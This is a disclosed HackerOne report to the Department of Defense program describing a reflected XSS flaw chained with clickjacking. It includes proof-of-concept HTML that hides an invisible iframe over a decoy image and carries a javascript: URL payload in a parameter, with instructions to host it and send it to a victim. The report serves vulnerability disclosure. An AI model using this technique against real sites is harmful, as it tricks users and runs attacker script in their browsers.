---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1171403'
original_report_id: '1171403'
title: Reflected XSS through ClickJacking
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-04-21T19:16:29.907Z'
disclosed_at: '2021-06-15T19:31:11.569Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS through ClickJacking

## Metadata

- HackerOne Report ID: 1171403
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-06-15T19:31:11.569Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**

Hello DoD team

i found an reflected XSS that require user interaction, but it's suspicious due the reflected payload in the page

███████

So in this case i chain it with click-jacking with image background same like the legal website to make it more trusting

████████

below is the code

```code
<style>

div {
       position:absolute;
       top:200px;
       left:900px;
       
   }
 body {

 	background-image: url('1.png');
 	background-repeat: no-repeat;
 	background-position: 300px 5px;

 }
</style>

<iframe src="https://███████?URL=javascript:alert(document.domain)//%0D%0A&#x22;https://google.com" id="xxx" width=100% height=100% style="opacity: 0;"></iframe>

```

## Impact

attacked can run malicious code in the victim browser

## System Host(s)
www.██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
host the provided code with the background image and send it to the victim

## Suggested Mitigation/Remediation Actions

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
